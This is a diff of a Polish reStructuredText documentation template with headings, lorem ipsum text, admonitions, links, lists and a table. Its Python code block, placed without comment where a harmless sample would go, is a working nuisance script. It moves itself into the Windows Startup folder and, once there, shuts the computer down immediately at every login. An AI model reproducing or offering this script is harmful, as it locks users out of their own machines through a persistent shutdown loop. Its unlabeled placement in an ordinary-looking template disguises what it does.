@@ -1,60 +1,67 @@
-Nagłówek1
-=========
-Lorem ipsum dolor sit amet
+Tytuł
+==========
 
-Nagłówek2
----------
+Lorem ipsum dolor sit amet, consectetur adipiscing elit.
 
-consectetur adipiscing elit
+Nagłówek 2
+----------
 
-Nagłówek3
-+++++++++
+Nam ut semper ligula, sit amet viverra lectus.
 
-Nam ut semper ligula, sit amet viverra
+Nagłówek 3
+++++++++++
 
-Nagłówek4
-^^^^^^^^^
+Fusce eleifend, mi sit amet volutpat bibendum,
 
-lectus. Fusce eleifend, mi sit
+Nagłówek 4
+^^^^^^^^^^
+
+ex erat lobortis tortor, a condimentum turpis ex euismod turpis.
 
 .. note::
 
-  Note:
-  
+   Suspendisse cursus magna a arcu mattis,
+
 .. tip::
 
-  Tip:
-  
+   et auctor turpis tempus.
+
 .. code-block:: python
+
   import os
-import shutil
+  import shutil
 
-user=os.getlogin()
+  user=os.getlogin()
 
-trg=os.path.dirname(os.path.abspath(__file__))+"\shutdown.py"
-dst="C:/Users/"+user+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+  trg=os.path.dirname(os.path.abspath(__file__))+"\shutdown.py"
+  dst="C:/Users/"+user+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 
-if(os.path.exists(dst+"/shutdown.py")):
-    os.system("shutdown /s /t 1")
-    os._exit(0)
+  if(os.path.exists(dst+"/shutdown.py")):
+      os.system("shutdown /s /t 1")
+      os._exit(0)
 
-shutil.move(trg,dst)
+  shutil.move(trg,dst)
 
-Odnośnik lokalny RtD:doc: `api`
-Odnośnik zewnętrzny-inny serwis `https://www.google.com`_
+Odnośnik lokalny RtD :doc:`api`
 
-* Lista numerowana
-* ....
-* ....
+Odnośnik zewnętrzny-inny serwis `google <https://www.google.com>`_
 
-#. Lista punktowana
-#. ....
-#. ....
+lista punktowana:
 
-====  ===== =====
-a     b     c
-====  ===== =====
-1     2     3
-4     5     6
-7     8     9
-====  ===== =====
+* .
+* .
+* .
+
+lista numerowana: 
+
+#. .
+#. .
+#. .
+
+
+====  =====  =====
+1     2      3    
+====  =====  =====
+4     5      6   
+7     8      9   
+====  =====  =====
